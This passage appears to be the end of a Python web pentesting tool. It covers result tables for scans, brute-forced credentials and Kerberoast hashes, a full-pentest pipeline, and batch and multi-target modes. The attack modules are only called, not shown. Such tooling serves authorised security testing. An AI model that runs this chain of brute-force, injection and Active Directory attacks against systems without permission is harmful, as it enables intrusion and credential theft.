        mark = f"{Fore.GREEN}OK{Style.RESET_ALL}" if present else f"{Fore.RED}AUSENTE{Style.RESET_ALL}"
        sec_rows.append([h, mark, _trim(v, 80)])
    print_table(
        headers=["Header", "Status", "Value"],
        rows=sec_rows,
        alignments=['<', '<', '<'],
        title="Headers de seguridad:",
    )

    # 3. Cookies
    cookies = general.get("cookies") or []
    if cookies:
        cookie_rows = [[c] for c in cookies]
        print_table(
            headers=["Cookie"],
            rows=cookie_rows,
            alignments=['<'],
            title="Cookies detected:",
        )

    # 4. HTTP methods + robots
    misc_rows = []
    if http_methods:
        misc_rows.append(["HTTP Methods allowed", _trim(_join_safe(http_methods), 90)])
    if robots_paths:
        misc_rows.append([f"Paths de robots.txt/sitemap ({len(robots_paths)})", _trim(_join_safe(robots_paths[:15]), 90)])
    if misc_rows:
        print_table(
            headers=["Category", "Value"],
            rows=misc_rows,
            alignments=['<', '<'],
            title="Information HTTP adicional:",
        )

    # 4b. Nmap (puertos abiertos)
    if nmap_ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        port_rows = []
        for p in nmap_ports[:50]:
            color = STATE_COLOR.get(p.get("state", ""), Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join(v for v in version_parts if v).strip() or "-"
            port_rows.append([
                f"{p.get('port', '-')}/{p.get('protocol', '')}",
                f"{color}{p.get('state', '-')}{Style.RESET_ALL}",
                _trim(p.get("service", "") or "-", 24),
                _trim(version_str, 60),
            ])
        print_table(
            headers=["Port", "Status", "Service", "Version"],
            rows=port_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports (nmap) {_count_label(len(nmap_ports), len(port_rows))}:",
        )
    if nmap_nse:
        nse_rows = []
        for item in nmap_nse[:40]:
            color = Fore.RED if item.get("interesting") else Fore.CYAN
            output = (item.get("output") or "").splitlines()[0] if item.get("output") else "-"
            nse_rows.append([
                f"{item.get('port', '-')}/{item.get('protocol', '')}",
                _trim(item.get("service") or "-", 18),
                f"{color}{item.get('script_id', '-')}{Style.RESET_ALL}",
                _trim(output, 85),
            ])
        print_table(
            headers=["Port", "Service", "Script", "Output"],
            rows=nse_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Targeted NSE Results {_count_label(len(nmap_nse), len(nse_rows))}:",
        )

    # 5. Spider
    if spider:
        spider_rows = [
            ["Total URLs", str(spider.get("total_urls", 0))],
            ["Unique parameters", str(spider.get("total_params", 0))],
            ["Forms", str(spider.get("total_forms", 0))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=spider_rows,
            alignments=['<', '>'],
            title="Spidering:",
        )
        sample_urls = spider.get("sample_urls") or []
        if sample_urls:
            url_rows = [[_trim(u, 110)] for u in sample_urls[:20]]
            print_table(
                headers=["URL"],
                rows=url_rows,
                alignments=['<'],
                title=f"Discovered URL sample {_count_label(spider.get('total_urls', 0), len(url_rows))}:",
            )

    # 5b. Source-code analysis
    if src_code:
        sev_stats = src_code.get("summary") or {}
        code_overview = [
            ["Pages analyzed", str(src_code.get("pages_analyzed", 0))],
            ["Assets JS/JSON analizados", str(src_code.get("assets_analyzed", 0))],
            ["Total findings", str(len(src_findings))],
            [f"{Fore.MAGENTA}Critical{Style.RESET_ALL}", str(sev_stats.get("critical", 0))],
            [f"{Fore.RED}High{Style.RESET_ALL}", str(sev_stats.get("high", 0))],
            [f"{Fore.YELLOW}Medium{Style.RESET_ALL}", str(sev_stats.get("medium", 0))],
            [f"{Fore.CYAN}Low{Style.RESET_ALL}", str(sev_stats.get("low", 0))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=code_overview,
            alignments=['<', '>'],
            title="Source-code analysis:",
        )
        if src_findings:
            sorted_src = sorted(
                src_findings,
                key=lambda x: SEV_ORDER.get(x.get("severity", "low"), 9),
            )
            code_rows = []
            for f in sorted_src[:30]:
                sev = f.get("severity", "low")
                color = SEV_COLOR.get(sev, Fore.WHITE)
                code_rows.append([
                    f"{color}{sev.upper()}{Style.RESET_ALL}",
                    _trim(f.get("type", "-"), 30),
                    _trim(f.get("value", "-"), 40),
                    _trim(f.get("url", "-"), 60),
                ])
            print_table(
                headers=["Severity", "Type", "Detected value", "URL"],
                rows=code_rows,
                alignments=['<', '<', '<', '<'],
                title=f"Source-code findings {_count_label(len(sorted_src), len(code_rows))}:",
            )

    # 6a. Subdominios (vhosts)
    if vhosts:
        vh_rows = []
        for v in vhosts[:30]:
            status = str(v.get("status", "-"))
            fqdn = _trim(v.get("fqdn") or v.get("subdomain", "-"), 80)
            size = str(v.get("size", "-"))
            sc = Fore.GREEN if status.startswith("2") else (Fore.YELLOW if status.startswith("3") else Fore.RED if status.startswith("4") else Fore.WHITE)
            vh_rows.append([f"{sc}{status}{Style.RESET_ALL}", fqdn, size])
        print_table(
            headers=["Status", "VHost", "Size"],
            rows=vh_rows,
            alignments=['<', '<', '>'],
            title=f"Subdomains found {_count_label(len(vhosts), len(vh_rows))}:",
        )

    # 6b. Directories
    if dir_hits:
        dir_rows = []
        for h in dir_hits[:30]:
            status = str(h.get("status", "-"))
            url = _trim(h.get("url", "-"), 90)
            size = str(h.get("size", "-"))
            sc = Fore.GREEN if status.startswith("2") else (Fore.YELLOW if status.startswith("3") else Fore.RED if status.startswith("4") else Fore.WHITE)
            dir_rows.append([f"{sc}{status}{Style.RESET_ALL}", url, size])
        print_table(
            headers=["Status", "URL", "Size"],
            rows=dir_rows,
            alignments=['<', '<', '>'],
            title=f"Directories found {_count_label(len(dir_hits), len(dir_rows))}:",
        )

    # 6c. WordPress / WPScan
    if wordpress:
        wp_version = wordpress.get("version") or {}
        wp_theme = wordpress.get("main_theme") or {}
        wp_users = wordpress.get("users") or []
        wp_vulns = wordpress.get("vulnerabilities") or []
        wp_rows = [
            ["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
            ["Version", wp_version.get("number") or "-"],
            ["Status", wp_version.get("status") or "-"],
            ["Main theme", wp_theme.get("name") or "-"],
            ["Users", str(len(wp_users))],
            ["Vulnerabilities", str(len(wp_vulns))],
            ["Credentials", str(len(wordpress.get("credentials") or []))],
        ]
        print_table(
            headers=["Field", "Value"],
            rows=wp_rows,
            alignments=['<', '<'],
            title="WordPress / WPScan:",
        )
        if wp_vulns:
            vuln_rows = []
            for v in wp_vulns[:30]:
                vuln_rows.append([
                    _trim(v.get("component_type", "-"), 14),
                    _trim(v.get("component", "-"), 30),
                    _trim(v.get("title", "-"), 70),
                    _trim(v.get("fixed_in", "-"), 20),
                ])
            print_table(
                headers=["Type", "Component", "Title", "Fixed in"],
                rows=vuln_rows,
                alignments=['<', '<', '<', '<'],
                title=f"Vulnerabilities WordPress {_count_label(len(wp_vulns), len(vuln_rows))}:",
            )

    # 7. API endpoints
    if api_endpoints:
        api_rows = []
        for ep in api_endpoints[:30]:
            status = str(ep.get("status", "-"))
            endpoint = _trim(ep.get("endpoint") or ep.get("url", "-"), 60)
            ctype = _trim(ep.get("content_type", "-"), 30)
            api_rows.append([status, endpoint, ctype])
        print_table(
            headers=["Status", "Endpoint", "Content-Type"],
            rows=api_rows,
            alignments=['<', '<', '<'],
            title=f"Discovered API Endpoints {_count_label(len(api_endpoints), len(api_rows))}:",
        )

    # 8. Users and emails
    if users or emails:
        ue_rows = []
        if users:
            ue_rows.append(["Users", _trim(_join_safe(users), 100)])
        if emails:
            ue_rows.append(["Emails", _trim(_join_safe(emails), 100)])
        print_table(
            headers=["Category", "Values"],
            rows=ue_rows,
            alignments=['<', '<'],
            title="Discovered users and emails:",
        )

    # 9. Injection
    if injection.get("executed"):
        inj_rows = [
            ["Forms detected", str(injection.get("forms_found", 0))],
            ["Detected GET parameters", str(injection.get("url_params_found", 0))],
            ["Tested GET parameters", str(len(injection.get("tested_get_params", [])))],
            ["Tested form inputs", str(len(injection.get("tested_form_inputs", [])))],
        ]
        print_table(
            headers=["Metric", "Value"],
            rows=inj_rows,
            alignments=['<', '>'],
            title="Injection tests:",
        )

    # 9b. Advanced tests
    adv_sum = SCAN_DATA.get("advanced_security") or {}
    if adv_sum:
        module_names_fs = ["ssrf", "ssti", "xxe", "crlf", "smuggling", "cache_poisoning"]
        adv_sum_rows = []
        for mod in module_names_fs:
            hits = adv_sum.get(mod) or []
            color = Fore.RED if hits else Fore.WHITE
            adv_sum_rows.append([mod.upper(), f"{color}{len(hits)}{Style.RESET_ALL}"])
        print_table(
            headers=["Module", "Findings"],
            rows=adv_sum_rows,
            alignments=['<', '>'],
            title="Advanced Tests de Seguridad:",
        )
        # Details only if there are findings.
        for mod, headers_detail, row_fn in [
            ("ssrf", ["Type", "Vector", "Payload/Value", "HTTP"],
             lambda r: [r.get("type","ssrf"), r.get("param") or r.get("header") or "-",
                        _trim(r.get("payload") or r.get("value") or "", 50), str(r.get("status","-"))]),
            ("ssti", ["URL", "Parameter", "Engine"],
             lambda r: [_trim(r.get("url",""), 60), r.get("param","-"), r.get("engine","-")]),
            ("xxe", ["URL", "Content-Type", "Status"],
             lambda r: [_trim(r.get("url",""), 60), r.get("content_type","-"), r.get("note","confirmado")]),
            ("crlf", ["Vector", "URL/Param", "Payload"],
             lambda r: [r.get("vector","-"), _trim(r.get("param") or r.get("url") or "",50), _trim(r.get("payload",""),40)]),
            ("smuggling", ["Tool/Type", "Detail"],
             lambda r: [r.get("tool") or r.get("type","-"), _trim(r.get("note") or r.get("output_snippet") or "",80)]),
            ("cache_poisoning", ["Header", "Injected value", "Status"],
             lambda r: [r.get("header","-"), _trim(r.get("value",""),40), "CONFIRMADO" if r.get("confirmed") else "REFLECTED"]),
        ]:
            hits = adv_sum.get(mod) or []
            if hits:
                print_table(
                    headers=headers_detail,
                    rows=[row_fn(r) for r in hits],
                    title=f"{mod.upper()} — Detail ({len(hits)}):",
                    border_color=Fore.RED if mod in ("ssrf","ssti","xxe","smuggling") else Fore.YELLOW,
                )

    # 10. Valid credentials
    if creds:
        cred_rows = []
        for c in creds:
            user = c.get("username") if isinstance(c, dict) else str(c)
            pwd = c.get("password") if isinstance(c, dict) else "-"
            cred_rows.append([f"{Fore.GREEN}{user}{Style.RESET_ALL}", f"{Fore.GREEN}{pwd}{Style.RESET_ALL}"])
        print_table(
            headers=["User", "Password"],
            rows=cred_rows,
            alignments=['<', '<'],
            title="Valid credentials found:",
            border_color=Fore.GREEN,
        )

    # 11. Active Directory
    if active_directory:
        ad_rows = [
            ["DC", _trim(active_directory.get("target") or "-", 60)],
            ["Domain", _trim(active_directory.get("domain") or "-", 60)],
            ["Mode", active_directory.get("auth_mode") or "-"],
            ["Kerbrute users", str(len((active_directory.get("kerbrute") or {}).get("valid_users") or []))],
            ["LDAP users", str(len(ad_ldap.get("users") or []))],
            ["LDAP groups", str(len(ad_ldap.get("groups") or []))],
            ["LDAP computers", str(len(ad_ldap.get("computers") or []))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["Credentials NXC", str(len(ad_creds))],
        ]
        print_table(
            headers=["Field", "Value"],
            rows=ad_rows,
            alignments=['<', '<'],
            title="Active Directory:",
        )
        if asrep_hashes:
            print_table(
                headers=["User", "Hash"],
                rows=[[_trim(h.get("username") or "-", 28), _trim(h.get("hash") or "-", 110)] for h in asrep_hashes[:20]],
                alignments=['<', '<'],
                title=f"AS-REP Roasting {_count_label(len(asrep_hashes), min(len(asrep_hashes), 20))}:",
            )
        if kerberoast_hashes:
            print_table(
                headers=["User/SPN", "Hash"],
                rows=[[_trim(h.get("username") or "-", 28), _trim(h.get("hash") or "-", 110)] for h in kerberoast_hashes[:20]],
                alignments=['<', '<'],
                title=f"Kerberoasting {_count_label(len(kerberoast_hashes), min(len(kerberoast_hashes), 20))}:",
            )

    # 12. Nuclei
    if nuclei_summary:
        sum_rows = []
        for sev in sorted(nuclei_summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            tids = nuclei_summary[sev]
            color = SEV_COLOR.get(sev, Fore.WHITE)
            unique_str = _join_safe(sorted(set(tids)))
            sum_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                str(len(tids)),
                _trim(unique_str, 100),
            ])
        print_table(
            headers=["Severity", "Count", "Unique templates"],
            rows=sum_rows,
            alignments=['<', '>', '<'],
            title="Vulnerabilities by severity (Nuclei):",
        )

    relevant_nuclei = [n for n in nuclei_findings if n.get('severity') in ('critical', 'high', 'medium', 'low')]
    if relevant_nuclei:
        rel_rows = []
        for n in relevant_nuclei[:30]:
            sev = n.get('severity', 'info')
            color = SEV_COLOR.get(sev, Fore.WHITE)
            rel_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                _trim(n.get('template_id', '-'), 40),
                _trim(n.get('name', '-'), 50),
                _trim(n.get('url', '-'), 60),
            ])
        print_table(
            headers=["Severity", "Template", "Name", "URL"],
            rows=rel_rows,
            alignments=['<', '<', '<', '<'],
            title=f"Findings Nuclei relevantes {_count_label(len(relevant_nuclei), len(rel_rows))}:",
        )

    # 12. Findings clasificados (FINDINGS)
    if FINDINGS:
        cats = {}
        for f in FINDINGS:
            text = _finding_text(f)
            m = re.match(r'^\[([^\]]+)\]', text)
            cat = m.group(1) if m else "OTHER"
            cats.setdefault(cat, []).append(text)
        cat_rows = []
        for cat in sorted(cats.keys()):
            cat_rows.append([cat, str(len(cats[cat]))])
        print_table(
            headers=["Category", "Count"],
            rows=cat_rows,
            alignments=['<', '>'],
            title=f"Findings clasificados (total: {len(FINDINGS)}):",
        )
        find_rows = []
        for f in FINDINGS[:40]:
            text = _finding_text(f)
            m = re.match(r'^\[([^\]]+)\]\s*(.*)', text)
            if m:
                cat = m.group(1)
                msg = m.group(2)
            else:
                cat, msg = "OTHER", text
            color = Fore.RED if cat.startswith(("VULN", "NUCLEI:CRITICAL", "NUCLEI:HIGH", "CRED", "WP:VULN")) else (
                Fore.YELLOW if cat.startswith(("NUCLEI:MEDIUM", "DIR", "VHOST", "WP")) else Fore.CYAN
            )
            find_rows.append([f"{color}{cat}{Style.RESET_ALL}", _trim(msg, 110)])
        print_table(
            headers=["Category", "Detail"],
            rows=find_rows,
            alignments=['<', '<'],
            title=f"Finding details {_count_label(len(FINDINGS), len(find_rows))}:",
        )

    print()
    print_good("Collection complete. Use 'Save report' on exit to export TXT/JSON/HTML/MD.")


def run_full_pentest(target, session, interactive_ad=True):
    print_phase("INICIANDO PENTESTING COMPLETO")
    # Order according to main menu:
    run_information_gathering(target, session)         # 2
    safe_execute(run_nmap_scan, target, session)       # 3
    run_nuclei_scan(target, session)                   # 4
    run_vhost_fuzzing(target, session)                 # 5
    run_directory_fuzzing(target, session)             # 6
    spider_urls = run_spider(target, session)          # 7
    # 8. Source-code analysis for all discovered URLs
    safe_execute(
        run_source_code_analysis,
        target, session,
        urls=list(spider_urls) if spider_urls else None,
    )
    run_injection_tests(target, session)               # 9
    run_advanced_security_tests(target, session)       # 10
    run_api_tests(target, session)                     # 11
    run_user_enum_bruteforce(target, session)          # 12
    run_wordpress_attacks_if_detected(target, session) # 13
    if interactive_ad:
        try:
            run_ad = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run the Active Directory module? [y/N]: ").strip().lower() in ('y', 's')
        except (KeyboardInterrupt, EOFError):
            run_ad = False
    else:
        run_ad = False
    if run_ad:
        safe_execute(run_active_directory_pentest, target)  # 13
    print_good("Full pentest completed.")
    print_final_summary(target)

# ========== MULTI-TARGET ==========

def _read_target_file(path):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                out.append(line)
    except Exception as e:
        print_error(f"Could not read list '{path}': {e}")
    return out

def _collect_targets(args):
    """Collect targets from -u (repeatable / comma-separated) and -L/--list (files).
    Normalize and deduplicate while preserving order."""
    raw = []
    for u in (args.url or []):
        raw.extend(p.strip() for p in u.split(",") if p.strip())
    for path in (args.list or []):
        raw.extend(_read_target_file(path))
    targets, seen = [], set()
    for t in raw:
        norm = normalize_url(t)
        if norm and norm not in seen:
            seen.add(norm)
            targets.append(norm)
    return targets

def _prompt_target_selection():
    """No arguments: ask for a single target or a list. Returns (targets, batch)."""
    print("\nSelect target type:")
    print("  1. Single URL")
    print("  2. Target list (multiple URLs or a file)")
    try:
        choice = input("Option [1]: ").strip() or "1"
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)

    if choice != "2":
        try:
            url = input("Enter target URL: ").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        return ([normalize_url(url)] if url else []), False

    print("Enter URLs separated by commas/spaces, or a .txt file path:")
    try:
        raw = input("Targets: ").strip()
    except (KeyboardInterrupt, EOFError):
        sys.exit(0)

    candidates = []
    expanded = os.path.expanduser(raw) if raw else ""
    if expanded and os.path.isfile(expanded):
        candidates = _read_target_file(expanded)
    else:
        candidates = [p for p in re.split(r'[\s,]+', raw) if p.strip()]

    targets, seen = [], set()
    for c in candidates:
        norm = normalize_url(c)
        if norm and norm not in seen:
            seen.add(norm)
            targets.append(norm)
    if not targets:
        print_error("No valid targets were provided.")
        sys.exit(1)

    try:
        batch = input(
            f"{len(targets)} targets loaded. Batch mode "
            f"(automatic full pentest per target)? [y/N]: "
        ).strip().lower() in ('y', 's')
    except (KeyboardInterrupt, EOFError):
        batch = False
    return targets, batch

def _reset_scan_state():
    """Clean state for starting a target from scratch."""
    global SCAN_DATA, AUTHENTICATED, AUTH_SESSION
    FINDINGS.clear()
    SCAN_DATA = _fresh_scan_data()
    AUTHENTICATED = False
    AUTH_SESSION = None

def _snapshot_state():
    return {
        "scan_data": SCAN_DATA,
        "findings": list(FINDINGS),
        "authenticated": AUTHENTICATED,
        "auth_session": AUTH_SESSION,
        "target": TARGET_URL,
    }

def _restore_state(snap):
    global SCAN_DATA, AUTHENTICATED, AUTH_SESSION, TARGET_URL
    SCAN_DATA = snap["scan_data"]
    FINDINGS.clear()
    FINDINGS.extend(snap["findings"])
    AUTHENTICATED = snap["authenticated"]
    AUTH_SESSION = snap["auth_session"]
    TARGET_URL = snap["target"]

def _print_markdown_block(target):
    report_data = {
        "tool": VERSION,
        "target": target,
        "date": time.strftime('%Y-%m-%d %H:%M:%S'),
        "findings": list(FINDINGS),
        "scan_data": _to_serializable(SCAN_DATA),
    }
    md = _build_markdown_report(report_data)
    print()
    print("=" * 70)
    print(" MARKDOWN SUMMARY (copy from the next line):")
    print("=" * 70)
    print(md)
    print("=" * 70)
    print_good("End of markdown. Copy the block above.")

def _dispatch_scan_option(option, target, session):
    """Run a module option (1-15) against 'target'. Returns the session
    (possibly new after authentication) if the option was a module, or None otherwise."""
    global AUTHENTICATED, AUTH_SESSION
    if option == '1':
        setup_authentication()
        if AUTHENTICATED:
            print_good("Authenticated session active for future tests.")
            return AUTH_SESSION
        print_warning("Authentication failed. Continuing unauthenticated.")
        return session
    handlers = {
        '2': lambda: run_information_gathering(target, session),
        '3': lambda: run_nmap_scan(target, session),
        '4': lambda: run_nuclei_scan(target, session),
        '5': lambda: run_vhost_fuzzing(target, session),
        '6': lambda: run_directory_fuzzing(target, session),
        '7': lambda: run_spider(target, session),
        '8': lambda: run_source_code_analysis(target, session),
        '9': lambda: run_injection_tests(target, session),
        '10': lambda: run_advanced_security_tests(target, session),
        '11': lambda: run_api_tests(target, session),
        '12': lambda: run_user_enum_bruteforce(target, session),
        '13': lambda: run_wordpress_attacks(target, session),
        '14': lambda: run_active_directory_pentest(target),
        '15': lambda: run_full_pentest(target, session),
    }
    fn = handlers.get(option)
    if fn is None:
        return None
    fn()
    return session

def _print_batch_summary(summary):
    if not summary:
        return
    rows = [[(t[:60]), str(n), st] for (t, n, st) in summary]
    print_table(
        headers=["Target", "Findings", "Status"],
        rows=rows,
        alignments=['<', '>', '<'],
        title=f"Batch summary ({len(summary)} targets):",
        border_color=Fore.CYAN,
    )

def run_batch_targets(targets):
    """Non-interactive: full pentest per target, per-target report, and final summary."""
    global TARGET_URL
    print_phase(f"BATCH MODE: {len(targets)} targets (full pentest per target)")
    summary = []
    for i, t in enumerate(targets, 1):
        print_phase(f"[{i}/{len(targets)}] {t}")
        _reset_scan_state()
        TARGET_URL = t
        session = get_session()
        status = "ok"
        try:
            run_full_pentest(t, session, interactive_ad=False)
        except KeyboardInterrupt:
            status = "interrupted"
            print_warning(f"Target {t} interrupted.")
            try:
                if input("Continue with the next target? [Y/n]: ").strip().lower() == 'n':
                    summary.append((t, len(FINDINGS), status))
                    break
            except (KeyboardInterrupt, EOFError):
                summary.append((t, len(FINDINGS), status))
                break
        except Exception as e:
            status = "error"
            print_error(f"Error en {t}: {e}")
        try:
            save_report(OUTPUT_FILE)
        except Exception as e:
            print_error(f"Could not save the report for {t}: {e}")
        summary.append((t, len(FINDINGS), status))
    print_phase("GLOBAL BATCH SUMMARY")
    _print_batch_summary(summary)
    print("\n" + Fore.GREEN + "Happy Hacking :)" + Style.RESET_ALL)

def run_multi_interactive(targets):
    """Interactive menu: each selected option runs against ALL targets,
    keeping per-target state (SCAN_DATA/FINDINGS) between modules."""
    global TARGET_URL
    states, sessions = {}, {}
    for t in targets:
        _reset_scan_state()
        TARGET_URL = t
        states[t] = _snapshot_state()
        sessions[t] = get_session()

    def _save_all():
        saved = 0
        for t in targets:
            _restore_state(states[t])
            if _has_scan_data():
                try:
                    save_report(OUTPUT_FILE)
                    saved += 1
                except Exception as e:
                    print_error(f"Report {t}: {e}")
        return saved

    def _exit_multi():
        print()
        if any((states[t]["findings"] or _state_has_data(states[t])) for t in targets):
            auto = OUTPUT_FILE is not None
            if not auto:
                try:
                    auto = input("\nSave one report per target? [Y/n]: ").strip().lower() != 'n'
                except (KeyboardInterrupt, EOFError):
                    auto = False
            if auto:
                n = _save_all()
                print_good(f"Reports saved: {n}")
        print("\n" + Fore.GREEN + "Happy Hacking :)" + Style.RESET_ALL)
        sys.exit(0)

    def _state_has_data(snap):
        _restore_state(snap)
        return _has_scan_data()

    while True:
        try:
            show_menu(targets=targets)
            option = input("Select an option (applies to ALL targets): ").strip()
        except (KeyboardInterrupt, EOFError):
            try:
                print()
                if input("\nExit the program? [Y/n]: ").strip().lower() != 'n':
                    _exit_multi()
            except (KeyboardInterrupt, EOFError):
                _exit_multi()
            continue

        try:
            if option == '18':
                _exit_multi()
            elif option in ('16', '17'):
                for t in targets:
                    _restore_state(states[t])
                    print_phase(f"{'MARKDOWN' if option == '16' else 'SUMMARY'}: {t}")
                    if not _has_scan_data():
                        print_warning("No data for this target yet.")
                    elif option == '16':
                        _print_markdown_block(t)
                    else:
                        print_final_summary(t)
                    states[t] = _snapshot_state()
            elif option in {str(n) for n in range(1, 16)}:
                for t in targets:
                    _restore_state(states[t])
                    print_phase(f"TARGET: {t}")
                    sess = _dispatch_scan_option(option, t, sessions[t])
                    if sess is not None:
                        sessions[t] = sess
                    states[t] = _snapshot_state()
            else:
                print_error("Invalid option. Try again.")
        except KeyboardInterrupt:
            try:
                print()
                if input("\nExit the program? [Y/n]: ").strip().lower() != 'n':
                    _exit_multi()
            except (KeyboardInterrupt, EOFError):
                _exit_multi()
            continue
        except Exception as e:
            print_error(f"Unexpected error: {e}")

        try:
            input("\nPress Enter to continue...")
        except (KeyboardInterrupt, EOFError):
            _exit_multi()

def main():
    global TARGET_URL, AUTHENTICATED, AUTH_SESSION, THREADS, DEFAULT_TIMEOUT, REQUEST_DELAY, OUTPUT_FILE, VERIFY_TLS

    parser = argparse.ArgumentParser(
        description=f"OWASP Scanner v{VERSION} - Web Security Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=("Examples:\n"
                "  python3 owasp-scanner.py -u https://example.com -o report.txt\n"
                "  python3 owasp-scanner.py -u a.com,b.com -u c.com   (interactive multi-target mode)\n"
                "  python3 owasp-scanner.py -L targets.txt --batch     (full pentest per target)")
    )
    parser.add_argument('--url', '-u', action='append', metavar='URL',
                        help='Target URL. Repeatable and accepts comma-separated values. '
                             'Omit for interactive mode.')
    parser.add_argument('--list', '-L', action='append', metavar='FILE',
                        help='File with one URL per line (supports # comments). Repeatable.')
    parser.add_argument('--batch', action='store_true',
                        help='Non-interactive mode: runs the full pentest for each target and '
                             'saves one report per target. Requires -u/-L.')
    parser.add_argument('--output', '-o', metavar='FILE',
                        help='Output file or report base path (for example: report.txt)')
    parser.add_argument('--threads', '-t', type=int, default=THREADS, metavar='N',
                        help=f'Number of threads (default: {THREADS})')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, metavar='S',
                        help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
    parser.add_argument('--delay', '-d', type=float, default=0.0, metavar='S',
                        help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--insecure', '-k', action='store_true',
                        help='Disable TLS certificate verification for labs and test environments')
    parser.add_argument('--no-color', action='store_true',
                        help='Disable colored output')
    parser.add_argument('--version', '-V', action='version', version=f'OWASP Scanner v{VERSION}')
    args = parser.parse_args()

    THREADS = args.threads
    DEFAULT_TIMEOUT = args.timeout
    REQUEST_DELAY = args.delay
    OUTPUT_FILE = args.output
    VERIFY_TLS = not args.insecure

    if args.no_color:
        global HAS_COLOR
        HAS_COLOR = False

    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(BANNER)
        print(DESCRIPTION)
        print(DEVELOPER + "\n")

    if not VERIFY_TLS:
        print_warning("TLS verification disabled (--insecure). Use only in test environments.")

    targets = _collect_targets(args)
    batch = args.batch

    # No CLI targets: interactive selector (single or list).
    if not targets and not batch:
        targets, batch = _prompt_target_selection()

    # Batch mode: requires targets and is non-interactive.
    if batch:
        if not targets:
            print_error("--batch requires at least one target (-u/-L).")
            sys.exit(1)
        run_batch_targets(targets)
        return

    # Multiple targets: interactive menu applied to all.
    if len(targets) > 1:
        print_info(f"{len(targets)} targets loaded. Each option will run against all targets.")
        run_multi_interactive(targets)
        return

    # Single target (or none: prompt in console).
    if targets:
        TARGET_URL = targets[0]
        print_info(f"Target: {TARGET_URL}")
    else:
        TARGET_URL = input("Enter target URL: ").strip()
        TARGET_URL = normalize_url(TARGET_URL)
        print_info(f"Target: {TARGET_URL}")

    session = get_session()

    def _exit_gracefully():
        """Close the program after showing the report and final message."""
        print()
        has_scan_data = _has_scan_data()
        if has_scan_data:
            auto_save = OUTPUT_FILE is not None
            if not auto_save:
                try:
                    auto_save = input(
                        f"\nSave scan report ({len(FINDINGS)} findings)? [Y/n]: "
                    ).strip().lower() != 'n'
                except (KeyboardInterrupt, EOFError):
                    auto_save = False
            if auto_save:
                save_report(OUTPUT_FILE)
        print("\n" + Fore.GREEN + "Happy Hacking :)" + Style.RESET_ALL)
        sys.exit(0)

    while True:
        try:
            show_menu()
            # Already in the main menu
            option = input("Select an option: ").strip()
        except (KeyboardInterrupt, EOFError):
            try:
                print()
                confirm = input("\nExit the program? [Y/n]: ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                confirm = 's'
            if confirm != 'n':
                _exit_gracefully()
            continue

        try:
            if option == '1':
                setup_authentication()
                if AUTHENTICATED:
                    session = AUTH_SESSION
                    print_good("Authenticated session active for future tests.")
                else:
                    print_warning("Authentication failed. Continuing unauthenticated.")
            elif option == '2':
                run_information_gathering(TARGET_URL, session)
            elif option == '3':
                run_nmap_scan(TARGET_URL, session)
            elif option == '4':
                run_nuclei_scan(TARGET_URL, session)
            elif option == '5':
                run_vhost_fuzzing(TARGET_URL, session)
            elif option == '6':
                run_directory_fuzzing(TARGET_URL, session)
            elif option == '7':
                run_spider(TARGET_URL, session)
            elif option == '8':
                run_source_code_analysis(TARGET_URL, session)
            elif option == '9':
                run_injection_tests(TARGET_URL, session)
            elif option == '10':
                run_advanced_security_tests(TARGET_URL, session)
            elif option == '11':
                run_api_tests(TARGET_URL, session)
            elif option == '12':
                run_user_enum_bruteforce(TARGET_URL, session)
            elif option == '13':
                run_wordpress_attacks(TARGET_URL, session)
            elif option == '14':
                run_active_directory_pentest(TARGET_URL)
            elif option == '15':
                run_full_pentest(TARGET_URL, session)
            elif option == '16':
                if not _has_scan_data():
                    print_warning("No data yet. Run a module or the full pentest first.")
                else:
                    report_data = {
                        "tool": VERSION,
                        "target": TARGET_URL,
                        "date": time.strftime('%Y-%m-%d %H:%M:%S'),
                        "findings": list(FINDINGS),
                        "scan_data": _to_serializable(SCAN_DATA),
                    }
                    md = _build_markdown_report(report_data)
                    print()
                    print("=" * 70)
                    print(" MARKDOWN SUMMARY (copy from the next line):")
                    print("=" * 70)
                    print(md)
                    print("=" * 70)
                    print_good("End of markdown. Copy the block above.")
            elif option == '17':
                if not _has_scan_data():
                    print_warning("No data yet. Run a module or the full pentest first.")
                else:
                    print_final_summary(TARGET_URL)
            elif option == '18':
                _exit_gracefully()
            else:
                print_error("Invalid option. Try again.")
        except KeyboardInterrupt:
            try:
                print()
                confirm = input("\nExit the program? [Y/n]: ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                confirm = 's'
            if confirm != 'n':
                _exit_gracefully()
            continue
        except Exception as e:
            print_error(f"Unexpected error: {e}")

        try:
            input("\nPress Enter to continue...")
        except (KeyboardInterrupt, EOFError):
            _exit_gracefully()

    _exit_gracefully()

if __name__ == "__main__":
    main()
